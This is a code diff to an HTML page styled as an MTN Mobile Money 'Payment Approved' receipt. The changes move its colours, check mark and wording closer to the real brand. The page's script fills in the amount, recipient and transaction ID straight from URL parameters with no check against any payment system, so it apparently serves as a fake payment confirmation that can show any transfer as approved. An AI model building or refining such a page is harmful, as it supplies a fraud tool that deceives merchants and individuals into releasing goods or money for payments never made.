@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>MTN Mobile Money · Payment Successful</title>
+<title>MTN Mobile Money · Payment Approved</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -13,7 +13,6 @@
     --mtn-deep:  #073A87;
     --mtn-white: #FFFFFF;
     --mtn-green: #28A745;
-    --mtn-green-deep: #1E7A3A;
     --mtn-yellow:#FFCC08;
     --mtn-text:  #456BA8;
     --mtn-gray:  #7C8798;
@@ -35,10 +34,10 @@
     position: relative; overflow: hidden;
   }
 
-  /* ===== Header ===== */
+  /* ===== Header — MTN blue gradient ===== */
   .top {
     position: relative; flex-shrink: 0;
-    background: linear-gradient(180deg, var(--mtn-green-deep) 0%, var(--mtn-green) 100%);
+    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
     padding: 18px 22px 40px;
     border-bottom-left-radius: 38% 32px;
     border-bottom-right-radius: 38% 32px;
@@ -51,17 +50,17 @@
   .brand .mtn { color: var(--mtn-yellow); }
   .brand .mm  { color: #FFFFFF; opacity: 0.95; }
 
-  .success-check {
+  .success-mark {
     width: 84px; height: 84px; border-radius: 50%;
-    background: rgba(255,255,255,0.15);
-    border: 3px solid rgba(255,255,255,0.7);
+    background: rgba(255,204,8,0.15);
+    border: 3px solid rgba(255,204,8,0.7);
     display: inline-flex; align-items: center; justify-content: center;
     margin: 26px auto 0;
     animation: popIn .5s cubic-bezier(.4, 1.4, .6, 1);
   }
-  .success-check svg {
+  .success-mark svg {
     width: 44px; height: 44px;
-    stroke: #fff; fill: none;
+    stroke: var(--mtn-yellow); fill: none;
     stroke-width: 3.4; stroke-linecap: round; stroke-linejoin: round;
     stroke-dasharray: 60; stroke-dashoffset: 60;
     animation: drawCheck .55s ease-out .15s forwards;
@@ -75,12 +74,19 @@
   }
 
   .success-title {
-    margin-top: 18px; font-size: 20px; font-weight: 800;
-    color: #fff; letter-spacing: -0.3px;
+    margin-top: 18px; font-size: 22px; font-weight: 800;
+    color: var(--mtn-yellow); letter-spacing: -0.3px;
   }
   .success-sub {
-    margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.85);
-    line-height: 1.55; max-width: 320px; margin-left: auto; margin-right: auto;
+    margin-top: 6px; font-size: 13px; font-weight: 700;
+    color: #fff; line-height: 1.45;
+    max-width: 320px; margin-left: auto; margin-right: auto;
+  }
+  .success-desc {
+    margin-top: 8px; font-size: 12.5px;
+    color: rgba(255,255,255,0.85);
+    line-height: 1.55; max-width: 320px;
+    margin-left: auto; margin-right: auto;
   }
 
   /* ===== Body ===== */
@@ -118,7 +124,7 @@
     background: var(--mtn-yellow);
   }
 
-  /* ===== Receipt details ===== */
+  /* ===== Receipt ===== */
   .receipt {
     width: 100%;
     background: var(--mtn-soft);
@@ -168,7 +174,7 @@
   }
   .info-note strong { font-weight: 800; }
 
-  /* ===== Action buttons ===== */
+  /* ===== Actions ===== */
   .actions {
     display: flex; flex-direction: column; gap: 10px;
     margin-top: auto;
@@ -230,9 +236,11 @@
     .top { padding: 16px 18px 32px; }
     .body { padding: 20px 18px 20px; }
     .brand { font-size: 16px; }
-    .success-check { width: 72px; height: 72px; margin-top: 20px; }
-    .success-check svg { width: 38px; height: 38px; }
-    .success-title { font-size: 18px; }
+    .success-mark { width: 72px; height: 72px; margin-top: 20px; }
+    .success-mark svg { width: 38px; height: 38px; }
+    .success-title { font-size: 20px; }
+    .success-sub { font-size: 12.5px; }
+    .success-desc { font-size: 12px; }
     .amount-block .amount { font-size: 28px; }
     .detail-row .k, .detail-row .v { font-size: 11px; }
     .btn-done { height: 48px; font-size: 13px; }
@@ -256,11 +264,12 @@
 
   <div class="top">
     <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
-    <div class="success-check">
+    <div class="success-mark">
       <svg viewBox="0 0 24 24"><polyline points="5 12 10 17 19 7"/></svg>
     </div>
     <div class="success-title">Payment approved</div>
-    <div class="success-sub">Your transaction has been approved. The amount will be credited within 5 minutes.</div>
+    <div class="success-sub">Your transaction was successful.</div>
+    <div class="success-desc">The amount will reflect in the recipient's account within 5 minutes.</div>
   </div>
 
   <div class="body">
@@ -268,7 +277,7 @@
     <div class="amount-block">
       <div class="label">Amount to be credited</div>
       <div class="amount" id="creditedAmount">—</div>
-      <div class="status-chip">Crediting within 5 mins</div>
+      <div class="status-chip">Reflects within 5 mins</div>
     </div>
 
     <div class="receipt" id="receipt">
@@ -299,7 +308,7 @@
         <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
       </div>
       <div>
-        You will receive an SMS confirmation once the amount is credited — usually within <strong>5 minutes</strong>. Please keep the transaction ID for your records.
+        You will receive an SMS confirmation once the amount reflects — usually within <strong>5 minutes</strong>. Please keep the transaction ID for your records.
       </div>
     </div>
 
@@ -325,9 +334,6 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  /* ============================================================
-     Read transaction from URL
-  ============================================================ */
   const params = new URLSearchParams(location.search);
   const tx = {
     ref: params.get('tx') || '',
@@ -378,9 +384,6 @@
     t._timer = setTimeout(() => t.classList.remove('show'), 2400);
   }
 
-  /* ============================================================
-     Populate receipt
-  ============================================================ */
   document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('creditedAmount').textContent =
       tx.am ? formatAmount(tx.am, tx.cur) : '—';
@@ -394,14 +397,11 @@
       SUPPORT_NUMBERS[tx.c] || '—';
   });
 
-  /* ============================================================
-     Share receipt — Web Share API / clipboard fallback
-  ============================================================ */
   function receiptText() {
     return [
       'MTN Mobile Money — Payment Approved',
       '------------------------------------',
-      'Status: Approved — crediting within 5 minutes',
+      'Status: Approved — reflects within 5 minutes',
       'Amount: ' + formatAmount(tx.am, tx.cur),
       'Recipient: ' + (tx.rn || '—'),
       'Transaction ID: ' + (tx.ref || '—'),
@@ -440,9 +440,6 @@
     }
   }
 
-  /* ============================================================
-     Done
-  ============================================================ */
   function finish() {
     window.location.href = '/';
   }
